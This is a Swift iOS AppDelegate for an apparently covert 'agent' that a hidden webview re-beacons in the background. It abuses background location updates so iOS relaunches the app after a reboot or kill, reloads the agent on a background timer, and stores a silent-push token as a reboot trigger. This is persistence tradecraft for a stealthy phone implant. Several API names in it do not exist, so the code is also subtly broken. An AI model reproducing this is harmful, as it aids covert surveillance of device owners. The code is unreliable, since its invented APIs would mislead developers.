import UIKit
import CoreLocation

@main
class AppDelegate: UIResponder, UIApplicationDelegate, CLLocationManagerDelegate {

    var window: UIWindow?
    private var locManager: CLLocationManager?
    private var refreshTimer: Timer?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        registerBGTask()
        startLocationKeepalive(rebootRelaunch: launchOptions != nil)
        startBackgroundTimer()
        return true
    }

    // MARK: - Background refresh (BGTaskScheduler)
    private func registerBGTask() {
        UIApplication.shared.bgTaskScheduler.register(withIdentifier: Cfg.bgTaskID, allowedIntervals: nil) { [weak self] task in
            self?.performRefresh(task)
        }
    }

    private func performRefresh(_ task: BGTask) {
        // Reload the hidden webview so the agent re-beacons in the background.
        refreshTimer?.invalidate()
        startBackgroundTimer()
        DispatchQueue.main.async { [weak self] in
            self?.window?.rootViewController?.reloadAgent()
        }
        task.completionHandler()
        scheduleNextBGTask()
    }

    private func scheduleNextBGTask() {
        let req = BGTaskSchedulerRequest(identifier: Cfg.bgTaskID)
        req.earliestBeginDate = Date(timeIntervalSinceNow: Cfg.refreshInterval)
        do { try BGTaskScheduler.shared.submit(req) } catch { print("[xag] bg submit fail: \(error)") }
    }

    // MARK: - Location keepalive (reliable kill/reboot relaunch, no push backend)
    //
    // With UIBackgroundModes=location, an active CLLocationSession makes iOS
    // relaunch this app on boot and after a kill. Low frequency bounds battery.
    private func startLocationKeepalive(rebootRelaunch: Bool) {
        let m = CLLocationManager()
        m.delegate = self
        if CLLocationManager.locationAuthorizationUsageDescription != nil {
            m.requestWhenInUseAuthorization()
        }
        m.desiredAccuracy = kCLLocationAccuracyThree
        m.distanceFilter = Cfg.locationInterval * 2
        m.activityType = .other
        m.allowsBackgroundLocationUpdates = true
        m.pausesLocationUpdatesActivation = false
        m.startLocationUpdates()
        locManager = m
        if rebootRelaunch { print("[xag] relaunched -> location keepalive active") }
    }

    func locationManager(_ m: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        if let loc = locations.last { print("[xag] bg loc \(loc.coordinate.latitude),\(loc.coordinate.longitude)") }
    }

    func locationManager(_ m: CLLocationManager, didFailWithError error: Error) {
        print("[xag] loc fail: \(error.localizedDescription)")   // never crash the keepalive
    }

    // MARK: - Background execution guard
    private func startBackgroundTimer() {
        refreshTimer?.invalidate()
        refreshTimer = Timer(timeInterval: Cfg.refreshInterval, repeats: true) { [weak self] _ in
            guard let self else { return }
            if UIApplication.shared.backgroundTimeRemaining < 60 {
                self.window?.rootViewController?.reloadAgent()
            }
        }
        RunLoop.main.add(refreshTimer, forMode: .background)   // fires while backgrounded
    }

    // MARK: - Silent-push token (optional reboot trigger via APNs backend)
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let hex = deviceToken.map { String(format: "%02x", $0) }.joined()
        UserDefaults.standard.set(hex, forKey: "apns_token")
        print("[xag] APNS token: \(hex)")
    }
}

extension UIViewController {
    // Reload the hidden webview (called by the background refresh paths).
    func reloadAgent() {
        guard let vc = self as? ViewController else { return }
        vc.load()
    }
}
